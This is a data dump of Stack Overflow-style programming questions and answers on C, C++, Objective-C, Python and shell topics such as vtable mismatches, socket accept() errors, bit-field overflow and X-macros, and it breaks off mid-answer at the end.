<p>It appears that GCC only added that warning in version 4.5.  In 4.4 and below, it does not report any warnings for that code, even with <code>-Wall -Wextra -ansi -pedantic</code>.  However, to be safe and 100% portable, you should change the definition of <code>DELAY_CYCLES</code> to avoid floating-point expressions.</p>
"
"<p>is there a cross-platform way to handle the CPU exceptions like segmentation faults, or division by zero? Lets say, I need to call some potentially unsafe functions (for example from a plug-in file), that can cause a segfault, or some other problems that I cannot test before I execute it. I know, that the C standard library has signal handling functions, but I don't know how to use them to handle the problem to avoid the program termination (I guess, I can't just jump to the location before the problematic functions execution, or can I?).
Under windows I could use the SEH exception handlers, but I can't do that under Linux, or any other OS. What about using my own exception handler to handle these problems, how much is that different between Windows/Linux? Would that be even possible (via assembler - lets say just on the x86 platform)?</p>

<p>I'm asking mostly out of curiosity, I'm not trying to solve an existing problem (yet).
Thanks</p>
","9530","","<p><a href=""http://libsigsegv.sourceforge.net/"" rel=""nofollow"">libsigsegv</a> is a cross-platform library for handling segmentation faults and stack overflows.  However, in the vast majority of cases, when you detect a segmentation fault, the right thing to do is to terminate execution as fast as possible instead of trying to recover from it.  A segfault is usually indicative of a bug or corrupted memory, and once you have corrupted memory, it's virtually impossible to recover from that.</p>
"
"<p>I compiled this code at home on my mac w/ xcode and there was no provblem. I compile it at school with g++ on linux and I get these errors:</p>

<p>:‘numeric_limits’ is not a member of std<br>
:expected primary-expression before ‘>’ token<br>
:no matching function for call to ‘max()’</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;cstdlib&gt;

using namespace std;

int GetIntegerInput(int lower, int upper)
{
    int integer = -1;
    do
    {    
        cin &gt;&gt; integer;
        cin.clear();
        cin.ignore(std::numeric_limits&lt;streamsize&gt;::max(), '\n');  //errors here
    }while (integer &lt; lower || integer &gt; upper);

    return integer;    
} 
</code></pre>

<p>I'm geussing maybe I have to include an extra header. If I take away the std:: it just gives me a similar error</p>

<p>‘numeric_limits’ was not declared in this scope</p>
","9530","","<p>You need to include the header file <code>&lt;limits&gt;</code>, which is where <code>std::numeric_limits</code> is defined.  Your Mac compiler was helping you out by automatically including that header file; however, you should not rely on that behavior and explicitly include any header files you need.</p>
"
"<p>I have some C++ code (written by someone else) which appears to be calling the wrong function. Here's the situation:</p>

<pre><code>UTF8InputStreamFromBuffer* cstream = foo();
wstring fn = L""foo"";
DocumentReader* reader;

if (a_condition_true_for_some_files_false_for_others) {
    reader = (DocumentReader*) _new GoodDocumentReader();
} else {
    reader = (DocumentReader*) _new BadDocumentReader();
}

// the crash happens inside the following call
// when a BadDocumentReader is used
doc = reader-&gt;readDocument(*cstream, fn);
</code></pre>

<p>The files for which the condition is true are processed fine; the ones for which it is false crash.  The class hierarchy for DocumentReader looks like this:</p>

<pre><code>class GenericDocumentReader {
    virtual Document* readDocument(InputStream &amp;strm, const wchar_t * filename) = 0;
}

class DocumentReader : public GenericDocumentReader {
    virtual Document* readDocument(InputStream &amp;strm, const wchar_t * filename) {
        // some stuff
    }
};

class GoodDocumentReader : public DocumentReader {
    Document* readDocument(InputStream &amp; strm, const wchar_t * filename);
}

class BadDocumentReader : public DocumentReader {
    virtual Document* readDocument(InputStream &amp;stream, const wchar_t * filename);
    virtual Document* readDocument(const LocatedString *source, const wchar_t * filename);
    virtual Document* readDocument(const LocatedString *source, const wchar_t * filename, Symbol inputType);
}
</code></pre>

<p>The following are also relevant:</p>

<pre><code>class UTF8InputStreamFromBuffer : public wistringstream {
    // foo
};
typedef std::basic_istream&lt;wchar_t&gt; InputStream;
</code></pre>

<p>Running in a Visual C++ debugger, it shows that the readDocument call on a BadDocumentReader is calling not </p>

<pre><code>readDocument(InputStream&amp;, const wchar_t*)
</code></pre>

<p>but rather</p>

<pre><code>readDocument(const LocatedString* source, const wchar_t *, Symbol)
</code></pre>

<p>This is confirmed by sticking cout statements in all the readDocuments.  After the call the source argument is of course full of garbage, which shortly causes a crash.  LocatedString does have a one-argument implicit constructor from InputStream, but checking with a cout shows it's not getting called.  Any idea what could explain this?</p>

<p><strong>Edit</strong>: other possibly relevant details: The DocumentReader classes are in a different library than the calling code.  I also have done a complete rebuild of all the code and the problem remained.</p>

<p><strong>Edit 2</strong>: I'm using Visual C++ 2008.</p>

<p><strong>Edit 3</strong>: I tried making a ""minimally compilable example"" with the same behavior, but was unable to replicate the problem.</p>

<p><strong>Edit 4</strong>: </p>

<p>At Billy ONeal's suggestion, I tried changing the order of the readDocument methods in the BadDocumentReader header.  Sure enough, when I change the order, it changes which of the functions gets called.  This seems to me to confirm my suspicion there's something weird going on with indexing into the vtable, but I'm not sure what's causing it.</p>

<p><strong>Edit 5</strong>:
Here's the disassembly for the few lines before the function call:</p>

<pre><code>00559728  mov         edx,dword ptr [reader] 
0055972E  mov         eax,dword ptr [edx] 
00559730  mov         ecx,dword ptr [reader] 
00559736  mov         edx,dword ptr [eax] 
00559738  call        edx  
</code></pre>

<p>I don't know much assembly, but it looks to me like it's dereferencing the reader variable pointer. The first thing stored in this part of memory should be the pointer to the vtable, so it dereferences that into eax.  Then it places the <em>first</em> thing in the vtable in edx and calls it. Recompiling with different orders of the methods doesn't seem to change this. It always wants to call the first thing in the vtable. (I could have completely misunderstood this, having no knowledge of assembly at all...)</p>

<p>Thanks for your help.</p>

<p><strong>Edit 6:</strong> I found the problem, and I apologize for wasting everyone's time.  The problem was that GoodDocumentReader was supposed to be declared as a subclass of DocumentReader, but in fact was not.  The C-style casts were suppressing the compiler error (should have listened to you, @sellibitze, If you'd like to submit your comment as an answer, I'll mark it as correct).  The tricky thing is that the code had been working for several months by pure accident until a revision when someone added two more virtual functions to GoodDocumentReader so it was no longer calling the right function by luck.</p>
","9530","","<p>This is happening because different source files disagree on the vtable layout of the class.  The code calling the function thinks that <code>readDocument(InputStream &amp;, const wchar_t *)</code> is at a particular offset, whilst the actual vtable has it at a different offset.</p>

<p>This usually occurs when you change the vtable, such as by adding or removing a virtual method in that class or any of its parent classes, and then you recompile one source file but not another source file.  Then, you get incompatible object files, and when you link them, things go boom.</p>

<p>To fix this, do a full clean and rebuild of all of your code: both the library code and your code that uses the library.  If you don't have the source code to the library but you do have the header files for it with the class definitions, then that is not an option.  In that case, you cannot modify the class definition -- you should revert it to how it was given to you and recompile all of your code.</p>
"
"<p>I need a C function which returns the final length of a formatted string so I can properly allocate the target string, rather than calculate the length myself. There is <code>snprintf</code> which does just this upon inability to write the entire string, but unfortunately there is no wide char alternative for it.</p>

<p><code>swprintf</code> returns -1 in case of error, not the needed length (why not the same behaviour ?!?)</p>

<p>The title mentioned <code>asprintf</code> seems to be of no help also, as it provides a non-wide version only.</p>

<p><code>_vscwprintf</code> can be used on windows, but I need a crossplatform, standard version, or at least a Linux version and I'll #ifdef the code.</p>

<p>Any ideas? Thanks!</p>
","9530","","<p>Yes, <a href=""http://linux.die.net/man/3/swprintf"" rel=""nofollow""><code>swprintf</code></a>.  Note that despite its name, <code>swprintf</code> is the wide-character equivalent of <code>snprintf</code>, <em>not</em> <code>sprintf</code>, in that it takes a buffer size as its second parameter; there is (fortunately) no wide-character version that does not take a buffer size.</p>

<p>Also, since it returns -1 on overflow, you'll have to get the total length of the string some other way.  The only really portable way to do this is to start with a buffer of some size, try formatting and see if it's big enough, and if not, increase the size and reformat until it is big enough.  This is not very efficient, as you can imagine.</p>
"
"<p>Say I have the code:</p>

<pre><code>std::string str = ""random"";

function(str);

void function (std::string str)
{
  std::cout &lt;&lt; str &lt;&lt; std::endl;
}
</code></pre>

<p>If I step through this code in gdb and then go into the function and do <code>p str</code> it would print out something like this <code>\362\241</code> but the cout will print to the screen the correct string <code>random</code>.  Has anyone seen this before if so what should I do?  Am I using the print command wrong in gdb or does it have something to do with how the compiler interprets the string?</p>
","9530","","<p>GDB is probably missing debug information for the STL for whatever reason.  Using <a href=""http://stackoverflow.com/questions/4830279/print-command-in-gdb-return-035-on-strings/4830536#4830536"">Employed Russian's example</a> with g++ (GCC) 4.3.4 20090804 (release) 1 and GNU gdb 6.8.0.20080328-cvs (cygwin-special), I get the following output:</p>

<pre><code>(gdb) p str
$1 = {static npos = &lt;optimized out&gt;,
  _M_dataplus = {&lt;std::allocator&lt;char&gt;&gt; = {&lt;__gnu_cxx::new_allocator&lt;char&gt;&gt; = {&lt;
No data fields&gt;}, &lt;No data fields&gt;}, _M_p = 0x28cce8 ""$▒▒""}}
</code></pre>

<p>Which is an interpretation of the raw data fields in <code>std::string</code>.  To get the actual string data, I have to reinterpret the <code>_M_p</code> field as a pointer:</p>

<pre><code>(gdb) p *(char**)str._M_dataplus._M_p
$2 = 0xd4a224 ""random""
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/4700901/filling-an-array-with-random-numbers-from-1-to-1010-in-c-or-c"">Filling an array with random numbers from 1 to 10^10 in C or C++</a>  </p>
</blockquote>



<p>Hello,</p>

<p>Simple question; I am looking for a way to get a higher random value than rand() gives me. rand() gives 32767 max. (http://msdn.microsoft.com/en-us/library/398ax69y%28v=vs.80%29.aspx)
I've tried redefining RAND_MAX, but I guess the compiler dosn't accept redefining, because it's within the same boundary as default. </p>

<p>I basically want a random value that fits in an unsigned integer (generating a SSRC number in an RTP packet). I really don't want collisions!
Is there any better win32 function than rand()?</p>

<p>Thanks in advance</p>
","9530","","<p>Changing <code>RAND_MAX</code> is not going to change the behavior of the <code>rand()</code> function, which is defined in the C runtime; it's just a convenient macro for you to know the range of output produced by <code>rand()</code>.</p>

<p>If you want high-quality random numbers suitable for use with cryptography, use <a href=""http://msdn.microsoft.com/en-us/library/aa379942%28v=vs.85%29.aspx"" rel=""nofollow""><code>CryptGenRandom</code></a>; see the full example at the bottom under Community Content for how to use it.</p>
"
"<pre><code>import subprocess
retcode = subprocess.call([""/home/myuser/go.sh"", ""abc.txt"", ""xyz.txt""])
</code></pre>

<p>When I run these 2 lines, will I be doing exactly this?:</p>

<pre><code>/home/myuser/go.sh abc.txt xyz.txt
</code></pre>

<p>Why do I get this error? But when I run go.sh normally, I don't get that error.</p>

<pre><code>File ""/usr/lib/python2.6/subprocess.py"", line 480, in call
    return Popen(*popenargs, **kwargs).wait()
  File ""/usr/lib/python2.6/subprocess.py"", line 633, in __init__
    errread, errwrite)
  File ""/usr/lib/python2.6/subprocess.py"", line 1139, in _execute_child
    raise child_exception
OSError: [Errno 8] Exec format error
</code></pre>
","9530","","<p>Yes, that's perfectly fine if all you're doing is calling the shell script, waiting for it to complete, and gathering its exit status, while letting its stdin, stdout, and stderr be inherited from your Python process.  If you need more control over any of those factors, then you just use the more general <a href=""http://docs.python.org/library/subprocess.html#subprocess.Popen"" rel=""nofollow""><code>subprocess.Popen</code></a>, but otherwise what you have is fine.</p>
"
"<p>I'm trying to create recursion using blocks. It works for a while, but eventually it crashes and gives me a bad access exception. This is my code:</p>

<pre><code>BOOL (^Block)(Square *square, NSMutableArray *processedSquares) = ^(Square *square, NSMutableArray *processedSquares) {
    [processedSquares addObject:square];

    if (square.nuked) {
        return YES; // Found a nuked square, immediately return
    }

    for (Square *adjacentSquare in square.adjacentSquares) {
        if ([processedSquares containsObject:adjacentSquare]) {
            continue; // Prevent infinite recursion
        }

        if (Block(adjacentSquare, processedSquares)) {
            return YES;
        }
    }

    return NO;
};

__block NSMutableArray *processedSquares = [NSMutableArray array];
BOOL foundNukedSquare = Block(square, processedSquares);
</code></pre>

<p>Explanation: I have a <code>Square</code> class that has a BOOL <code>nuked</code>. It also has an NSArray <code>adjacentSquares</code> containing other Squares.</p>

<p>I want to check whether a square, or one of its 'connected' squares, is nuked or not. </p>

<p>The array <code>processedSquares</code> is to keep track of the squares I have checked to prevent infinite recursion.</p>

<p>When I run this, it's doing a lot of calls of this block (as expected). But at some point, it crashes at the last line with a bad access exception.</p>

<p>I also get this in the console:</p>

<blockquote>
  <p>Cannot access memory at address 0x1<br>
  Cannot access memory at address 0x1<br>
  Cannot access memory at address 0x1<br>
  Cannot access memory at address 0x1<br>
  warning: Cancelling call - objc code on the current thread's stack makes this unsafe.</p>
</blockquote>

<p>I'm not that familiar with blocks and recursion. Any ideas?</p>

<hr>

<h1>Edit 1</h1>

<p>As requested, the backtrace:</p>

<pre><code>#0  0x00000001 in ??
#1  0x000115fb in -[Square connectedToNukedSquare] at   Square.m:105
#2  0x00010059 in __-[Bot makeMove]_block_invoke_1 at Bot.m:94
#3  0x91f3f024 in _dispatch_call_block_and_release
#4  0x91f31a8c in _dispatch_queue_drain
#5  0x91f314e8 in _dispatch_queue_invoke
#6  0x91f312fe in _dispatch_worker_thread2
#7  0x91f30d81 in _pthread_wqthread
#8  0x91f30bc6 in start_wqthread
</code></pre>
","9530","","<p>You're liking doing something wrong with the setup -- your <code>Square</code> objects are probably messed up somehow.  Here's a complete example that works fine for me, maybe it can help you find your mistake:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;Foundation/Foundation.h&gt;

@interface Square : NSObject
{
  BOOL nuked;
  NSArray *adjacentSquares;
}

@property(nonatomic) BOOL nuked;
@property(nonatomic, retain) NSArray *adjacentSquares;
@end

@implementation Square

@synthesize nuked;
@synthesize adjacentSquares;

@end;

BOOL (^Block)(Square *square, NSMutableArray *processedSquares) = ^(Square *square, NSMutableArray *processedSquares) {
  [processedSquares addObject:square];

  if (square.nuked) {
    return YES; // Found a nuked square, immediately return
  }

  for (Square *adjacentSquare in square.adjacentSquares) {
    if ([processedSquares containsObject:adjacentSquare]) {
      continue; // Prevent infinite recursion
    }

    if (Block(adjacentSquare, processedSquares)) {
      return YES;
    }
  }

  return NO;
};

int main(int argc, char **argv)
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  Square *s1, *s2;
  s1 = [[Square alloc] init];
  s2 = [[Square alloc] init];
  s1.adjacentSquares = [NSArray arrayWithObjects:s2, nil];
  s2.adjacentSquares = [NSArray arrayWithObjects:s1, nil];

  __block NSMutableArray *processedSquares = [NSMutableArray array];
  BOOL foundNukedSquare = Block(s1, processedSquares);
  printf(""%d\n"", foundNukedSquare);

  [s1 release];
  [s2 release];

  [pool release];

  return 0;
}
</code></pre>
"
"<p><strong>This is strictly in C.</strong></p>

<p>Say you're given one base struct, and 2 other derived structs. These derived structs are not derived in the classical sense (ie: A : B), rather, they only contain structs of the base type. So if struct A is the base and B is one of the 2 derived structs, B would have a member of type A. Like this:</p>

<pre><code>struct A {
     // blah blah...
};

struct B {
     A part_a;
     // more stuff...
}

struct C {
     A part_a;
     // SO MUCH STUFF
}
</code></pre>

<p>Say you have a function, A_downcast_B, something like this:</p>

<pre><code>B * A_downcast_B(A * a)
{
     // downcast the A* here somehow
}
</code></pre>

<p>You want this function to return <code>0</code> or <code>-1</code> if <code>'a'</code> could not be successfully downcasted to a struct of type <code>B</code>. So for example, if a 'derived' struct of type <code>C</code> had a pointer to it of type <code>A*</code>, and that pointer were passed to this function, the function would return <code>0</code>, <code>-1</code> or <code>null</code>.</p>

<p>Is there a way to do this? I've been thinking about this for a few hours now and it's got me stumped.</p>
","9530","","<p>It's impossible to do without embedding some sort of runtime type information in <code>struct A</code>.  For example, you could store a pointer to some sort of type information, and you must initialize that any time you create any 'derived' struct.</p>

<pre><code>struct RTTI {
  const char *typename;
  // etc.
};

struct A {
  const RTTI *rtti;
  // rest of A
};

struct B {
  A part_a;
  ...
};

const RTTI RTTI_B = {""B""};

struct C {
  A part_a;
  ...
};

const RTTI RTTI_C = {""C""};

void make_B(B *b)
{
  b-&gt;part_a.rtti = &amp;RTTI_B;
  // make the rest of B
}

void make_C(C *c)
{
  c-&gt;part_a.rtti = &amp;RTTI_C;
  // make the rest of C
}

B * A_downcast_B(A * a)
{
   return (a-&gt;rtti == &amp;RTTI_B) ? (B*)a : NULL;
}
</code></pre>

<p>Note that this is really just a simplified implementation of C++'s <code>dynamic_cast</code> operator, which only works with polymorphic data types.  The reason that for that is that the runtime can only access the runtime type information if the object has some sort of type information embedded in it—its vtable.</p>
"
"<p>as the title suggests... I need to use floating points as array indexes, but the GCC compiler spits out an error complaining.</p>

<p>Basically I have a mathematical function say F(x,t) where the function has variables x and t. The problem I'm having is that I'm trying to increment x and t in type float, so that I can calculate different values for the function at different x, and t. So naturally I would have two for loops:</p>

<pre><code>for (x = x_min; x &lt; x_max; x += dx) {
    for (t = t_min; t &lt; t_min; t += dt) {
        f[x][t] = 10*x + 10*t; // Over simplified.. but you get the idea
    }
}

// And then perform some fourier transform
fft(f[x][t], 256, 1);
</code></pre>

<p>So yea, that is why I was wondering if it is possible to get floating points as the array index.</p>
","9530","","<p>Yes.  From the C99 standard §6.5.2.1 (Array Subscripting):</p>

<blockquote>
  <p>One of the expressions shall have type ‘‘pointer to object <em>type</em>’’, the other expression shall have integer type, and the result has type ‘‘<em>type</em>’’.</p>
</blockquote>

<p>If you want to use a floating-point number as an array index, you need to cast it to an integer.  This is often a bad idea, because any slight rounding errors during your calculations could easily result in the array index being off by 1 after the truncation.</p>
"
"<p>I need to start process within python script, so I use for this subprocess.Popen() and give env variable through parameter env of Popen function, but my process doesn't see needed environment variables. 
How can I do it? 
Any help will be appriciated.</p>

<p>I'm running OS X 10.5.</p>

<p>Example:</p>

<pre><code>env = os.environ
env[""Foo""] = foo

cmd = ""/usr/bin/sudo -H -u ""+ self.getCurrentUserName() + ""-P"" + +os.path.join(dir, app) + app_args

p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, cwd=dir, env=env)
</code></pre>
","9530","","<p>By default, <code>sudo</code> resets the environment of the program it runs for security reasons.  If you want to avoid that, you need to pass in the <code>-E</code> flag to <code>sudo</code>, and either the command you're running has to have the <code>SETENV</code> tag or the <code>setenv</code> option has to be set in the <code>sudoers</code> file.  See the <a href=""http://www.sudo.ws/sudo/sudo.man.html"" rel=""nofollow""><code>sudo</code> man page</a> and the <a href=""http://www.sudo.ws/sudo/sudoers.man.html"" rel=""nofollow""><code>sudoers</code> man page</a> for more information.</p>
"
"<p>ive just done so much research and tried so much but nothing works. I am trying to compile a simple hello world program in GTK in Cygwin using make. It gives me error: ""lab0.c:1:21: error: gtk/gtk.h: No such file or directory....""
I installed cygwin with all packages. I also imported the all in one gtk files into the cygwin folders but it gives me same error. Here are my programs:</p>

<p>Lab0.c</p>

<pre><code>#include &lt;gtk/gtk.h&gt;

 int main (int argc, char *argv[])
 {
    GtkWidget *window;
    GtkWidget *label;

    gtk_init (&amp;argc, &amp;argv);

    /* create the main, top level, window */
    window = gtk_window_new (GTK_WINDOW_TOPLEVEL);

    /* give it the title */
    gtk_window_set_title (GTK_WINDOW (window), ""Hello World"");

    /* Connect the destroy signal of the window to gtk_main_quit
     * When the window is about to be destroyed we get a notification and
     * stop the main GTK+ loop
     */
    g_signal_connect (window, ""destroy"", G_CALLBACK (gtk_main_quit), NULL);

    /* Create the ""Hello, World"" label  */
    label = gtk_label_new (""Hello, World"");

    /* and insert it into the main window  */
    gtk_container_add (GTK_CONTAINER (window), label);

    /* make sure that everything, window and label, are visible */
    gtk_widget_show_all (window);

    /* start the main loop, and let it rest there until the application is closed */
    gtk_main ();

    return 0;
 }
</code></pre>

<p>makefile</p>

<pre><code># Makefile for Hello World Program (lab0).

all: lab0

lab0: lab0.o
    g++ -Wall lab0.o -o lab0

lab0.o: lab0.c
    g++ -Wall -c lab0.c -o lab0.o
</code></pre>

<p>I really need to get gtk working. Please help me. </p>
","9530","","<p>You need to install the libgtk2.0-devel package to get the header files you need for development; you probably only installed the runtime and/or source code packages, which are not sufficient.</p>
"
"<p>In Visual Studio 2005 on 32-bit Windows, why doesn't my console display characters from 128 to 255?</p>

<p>for example:</p>

<pre><code>cout &lt;&lt; ""¿"" &lt;&lt; endl;  //inverted question mark
</code></pre>

<p><strong>Output:</strong></p>

<pre><code>┐
Press any key to continue . . .
</code></pre>
","9530","","<p>Because the Win32 console uses <a href=""http://en.wikipedia.org/wiki/Code_page_437"" rel=""nofollow"">code page 437</a> (aka the OEM font) to render characters, whereas most of the rest of Windows uses <a href=""http://en.wikipedia.org/wiki/Windows-1252"" rel=""nofollow"">Windows-1252</a> for single-byte character codes.</p>

<p>The character ""¿"" is the Unicode character INVERTED QUESTION MARK, which has code point 0xBF (191 decimal) in Unicode, ISO 8859-1, and Windows-1252.  The code point 0xBF in CP437 corresponds to the character ""┐"", which is BOX DRAWINGS LIGHT DOWN AND LEFT (code point U+2510).</p>

<p>As long as you're using the Windows console, you can display only the characters in CP437 and no others.  If you want to display other Unicode characters, you'll need to use a different environment.</p>
"
"<p>In the next code, while I try to connect a client the server shows the following error:
""invalid argument"", I can't see the error.</p>

<pre><code>if((l_sock=socket(AF_INET,SOCK_STREAM,0))!=-1)
{
    struct sockaddr_in srv_dir;

    srv_dir.sin_family=AF_INET;
    srv_dir.sin_port=8500;
    srv_dir.sin_addr.s_addr=INADDR_ANY;

    if((bind(l_sock,(struct sockaddr *)&amp;srv_dir,sizeof(struct sockaddr_in)))!=-1)
    {
        if(!(listen(l_sock,5)))
        {
            signal(SIGINT,cerraje);
            int t_sock;
            struct sockaddr_in cli_dir;
            socklen_t tam;
            time_t tstmp;
            struct tm * res;
            res=(struct tm *)malloc(sizeof(struct tm));


            while(!key)
            {
                if((t_sock=accept(l_sock,(struct sockaddr *)&amp;cli_dir,&amp;tam))!=-1)
                {
                    tstmp=time(&amp;tstmp);
                    res=gmtime(&amp;tstmp);
                    send(t_sock,res,sizeof(struct tm),0);
                    wr_hora(*res,cli_dir.sin_addr);         
                }
                else
                    perror(""Petición no atendida"");//The error is printed here.
</code></pre>

<p>Thank you very much.</p>
","9530","","<p>Read the documentation on <a href=""http://linux.die.net/man/2/accept""><code>accept(2)</code></a>:</p>

<blockquote>
  <p>The <em>addrlen</em> argument is a value-result argument: it should initially contain the size of the structure pointed to by <em>addr</em>; on return it will contain the actual length (in bytes) of the address returned. When <em>addr</em> is NULL nothing is filled in. </p>
</blockquote>

<p>So you need to initialize the value of <code>tam</code> passed into <code>accept</code> with <code>sizeof(cli_dir)</code>.  You're fortunate that the socket library was able to catch your error, because you're passing in uninitialized memory, which results in undefined behavior.</p>
"
"<p>I have a NSString object and want to change it into unichar.</p>

<pre><code>int decimal = [[temp substringFromIndex:2] intValue]; // decimal = 12298

NSString *hex = [NSString stringWithFormat:@""0x%x"", decimal]; // hex = 0x300a

NSString *chineseChar = [NSString stringWithFormat:@""%C"", hex];

// This statement log a different Chinese char every time I run this code 
NSLog(@""%@"",chineseChar); 
</code></pre>

<p>When I see the log, It gives different character every time when I run my code.
m I missing something...?</p>
","9530","","<p>The <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html#//apple_ref/doc/uid/TP40004265"" rel=""nofollow""><code>%C</code> format specifier</a> takes a 16-bit Unicode character (<code>unichar</code>) as input, not an <code>NSString</code>.  You're passing in an <code>NSString</code>, which is getting reinterpreted as an integer character; since the string can be stored at a different address in memory each time you run, you get that address as an integer, which is why you get a different Chinese character every time you run your code.</p>

<p>Just pass in the character as an integer:</p>

<pre><code>unichar decimal = 12298;
NSString *charStr = [NSString stringWithFormat:@""%C"", decimal];
// charStr is now a string containing the single character U+300A,
// LEFT DOUBLE ANGLE BRACKET
</code></pre>
"
"<p>I'm looking to do the equivalent of <code>_grep -B14 MMA</code></p>

<p>I have a URL that I open and it spits out many lines. 
I want to </p>

<ol>
<li>find the line that has 'MMa'  </li>
<li>then print the 14th line before it</li>
</ol>

<p>I don't even know where to begin with this. </p>

<pre><code>import urllib
import urllib2

url = ""https://longannoyingurl.com""

opts = {
  'action': 'Dump+It'
}
data = urllib.urlencode(opts)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
print  response.read() # gives the full html output
</code></pre>
","9530","","<p>You can split a single string into a list of lines using <a href=""http://docs.python.org/library/stdtypes.html#str.splitlines"" rel=""nofollow""><code>mystr.splitlines()</code></a>.  You can test if a string matches a regular expression using <a href=""http://docs.python.org/library/re.html#re.match"" rel=""nofollow""><code>re.match()</code></a>.  Once you find the matching line(s), you can index backwards into your list of lines to find the 14th line before.</p>
"
"<p>can I trust that the C compiler does modulo 2^n each time I access a bit field?
Or is there any compiler/optimisation where a code like the one below would not print out Overflow?</p>

<pre><code>struct {
  uint8_t foo:2;
} G;

G.foo = 3;
G.foo++;

if(G.foo == 0) {
  printf(""Overflow\n"");
}
</code></pre>

<p>Thanks in Advance, Florian </p>
","9530","","<p>Yes, you can trust the C compiler to do the right thing here, as long as the bit field is declared with an unsigned type, which you have with <code>uint8_t</code>.  From the C99 standard §6.2.6.1/3:</p>

<blockquote>
  <p>Values stored in unsigned bit-fields and objects of type unsigned char shall be represented using a pure binary notation.<sup>40)</sup></p>
</blockquote>

<p>From §6.7.2.1/9:</p>

<blockquote>
  <p>A bit-field is interpreted as a signed or unsigned integer type consisting of the specified number of bits.<sup>104)</sup> If the value 0 or 1 is stored into a nonzero-width bit-field of type <code>_Bool</code>, the value of the bit-field shall compare equal to the value stored.</p>
</blockquote>

<p>And from §6.2.5/9 (emphasis mine):</p>

<blockquote>
  <p>The range of nonnegative values of a signed integer type is a subrange of the corresponding unsigned integer type, and the representation of the same value in each type is the same.<sup>31)</sup> <strong>A computation involving unsigned operands can never overflow, because a result that cannot be represented by the resulting unsigned integer type is reduced modulo the number that is one greater than the largest value that can be represented by the resulting type.</strong></p>
</blockquote>

<p>So yes, you can be sure that any standards-conforming compiler will have <code>G.foo</code> overflow to 0 without any other unwanted side effects.</p>
"
"<p>converting mp3 to ogg-files is dine by a simple script.</p>

<p>But: When i construct the new pathname and filename
with</p>

<pre><code>    # set the 'file' variable first
    file=""$1""
    # get extension; everything after last '.'
    ext=${file##*.} 
    mp32ogg --verbose --delete --quality=0 --rename=""${file%/*}/`basename ""$file"" .${file##*.}`""  ""$1""|| exit 1
</code></pre>

<p>the file-/pathnames that have spaces will be created with underscores.</p>

<p>And i see no reason... all help is welcome!</p>

<p>Appelgebak</p>
","9530","","<p>By default, <code>mp32ogg</code> automatically replaces spaces (and lots of other non-alphabetic characters) with underscores in the output filename.  To suppress this behavior, pass in the (undocumented) <code>--no-replace</code> flag.</p>
"
"<p>Is it possible to do something like this:</p>

<pre><code>  #define F(x) \
    #ifdef DOUBLE \
      2*x \
    #else \
      x \
    #endif
</code></pre>

<p>so that when I use <code>F</code>, what it expands to depends on whether the macro <code>DOUBLE</code> is defined?  I don't think so, but I'm hopeful.  GNU expansions are fine.</p>

<p><strong>Edit</strong>
In response to some of the answers, I'm really using this to do some code generation, where the code is slightly different depending on where it gets defined.  Because of the order in which some files are included and where the relevant macros need to be defined, switching it around that way requires a bit of factoring.  I may have to do it, but would be thrilled if I don't have to unpaint myself from this corner!</p>
","9530","","<p>No.  The closest thing you can do is to put that in a header file, and #include that header file each time the definitions you care about change.  This is sometimes called the ""X"" pattern, because <code>X</code> is used as a macro that changes definition.</p>

<p>For example, one common usage of that pattern is to autogenerate the string names of enum values:</p>

<pre><code>// File myenum_values.h
// NOTE: _no_ header guards so we can include this file multiple times
X(Apple)
X(Orange)
X(banana)

// File myenum.h
enum Fruit
{
#define X(x) x,
#include ""myenum_values.h""
}

const char *FruitNames[] =
{
#undef X
#define X(x) #x,
#include ""myenum_values.h""
};

// We now have an array of fruit names without having to define the enum twice
</code></pre>
"
"<p>I really like the colored manpages which can are achieved by</p>

<pre><code>export LESS_TERMCAP_mb=$'\E[01;31m'
export LESS_TERMCAP_md=$'\E[01;31m'
export LESS_TERMCAP_me=$'\E[0m'
export LESS_TERMCAP_se=$'\E[0m'
export LESS_TERMCAP_so=$'\E[01;44;33m'
export LESS_TERMCAP_ue=$'\E[0m'
export LESS_TERMCAP_us=$'\E[01;32m'
</code></pre>

<p>in your .bashrc or .zshrc.
My question is: How do I export these variables in tcsh? I have to use tcsh at work and cannot get it working. I tried plenty of variations, but nothing worked. Simply replacing export with setenv and = with "" "" doesn't do the trick.
But it should work somehow. If i start a tcsh out of my zsh with this exports set I can enjoy colored manpages in tcsh, also. But that's an ugly workaround.</p>
","9530","","<p>The problem is that tcsh isn't interpreting the escape sequence in your variable name, so the environment variable ends up with a literal <code>\E</code> in it when you try to set it with tcsh.  Here's one way you can get around that, using Bash to interpret the escape sequences, although it's a little ugly:</p>

<pre><code>% setenv LESS_TERMCAP_md `bash -c 'echo -en ""\e[01;31m""'`
% setenv LESS_TERMCAP_me `bash -c 'echo -en ""\e[0m""'`
% setenv LESS_TERMCAP_se `bash -c 'echo -en ""\e[0m""'`
% setenv LESS_TERMCAP_so `bash -c 'echo -en ""\e[01;44;33m""'`
% setenv LESS_TERMCAP_ue `bash -c 'echo -en ""\e[0m""'`
% setenv LESS_TERMCAP_us `bash -c 'echo -en ""\e[01;32m""'`
</code></pre>
"
"<p>Is it possible to create some of equivalent in iOS objective-c ""performSelectorOnMainThread"" functionality on C/C++ for Windows and UNIX, not iOS.
Many thanks.</p>
","9530","","<p>No, you'll have to roll your own.  One way to do this would be to keep a global function pointer that your main thread checks each iteration of the main loop.  For example:</p>

<pre><code>// Global variables
pthread_mutex_t gMutex = PTHREAD_MUTEX_INITIALIZER;
void (*gFuncPtr)(void*);
void *gFuncArg;

// Your program's main loop in the main thread
while(programIsRunning())
{
    // If we have a function to call this frame, call it, then do the rest of
    // our main loop processing
    void (*funcPtr)(void*);
    void *funcArg;

    pthread_mutex_lock(&amp;gMutex);
    funcPtr = gFuncPtr;
    funcArg = gFuncArg;
    gFuncPtr = NULL;
    pthread_mutex_unlock(&amp;gMutex);

    if(funcPtr != NULL)
        (*funcPtr)(funcArg);

    // Rest of main loop
    ...
}

// Call this function from another thread to have the given function called on
// the main thread.  Note that this only lets you call ONE function per main
// loop iteration; it is left as an exercise to the reader to let you call as
